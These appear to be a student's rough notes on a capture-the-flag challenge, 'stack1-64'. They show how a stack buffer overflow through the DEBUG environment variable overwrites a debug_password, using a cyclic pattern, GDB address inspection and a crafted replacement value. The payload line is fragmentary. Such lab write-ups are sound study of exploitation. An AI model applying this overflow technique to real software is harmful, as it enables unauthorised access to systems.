# stack1-64

file in dir:
`/problems/stack1r-64_6_f8971f22ac04a7dad46dfe8bde78b565`

## Steps

> code in ./stack1.c
> Using ENV to overwrite debug_password and get debug value from file

1) exploiting an enviornment var
- `generator_mode = getenv("DEBUG")`
- thus, we need to set the DEBUG env variable as some sort of patterened text to figure out exactly where it is overflowing
  - export DEBUG=`pwn cyclic -n4 256`
- echo $DEBUG

`aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaac`

1) inital GDB

- `gdb stack1-64`
- `b main`
- `r`
- next instruction until the buffer is coppied into a new variable with strcpy
- `p &debug_password`
  - `0x7fffffffe32c`
  - `x/s 0x7fffffffe32c`
    - **caab**
  - find the above string in the dump

aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaab**caab**daabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaac

2) new exploit string

- replace `caab` with `0x0d0a0d0a` (what the debug pswd is set to in code)

> aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaab\n\
n 0x0d 0a0d0a

p &generator_mode
$3 = (char **) 0x7fffffffe2d8
gefâž¤  p &debug_password
$4 = (volatile int *) 0x7fffffffe2cc

12 bytes away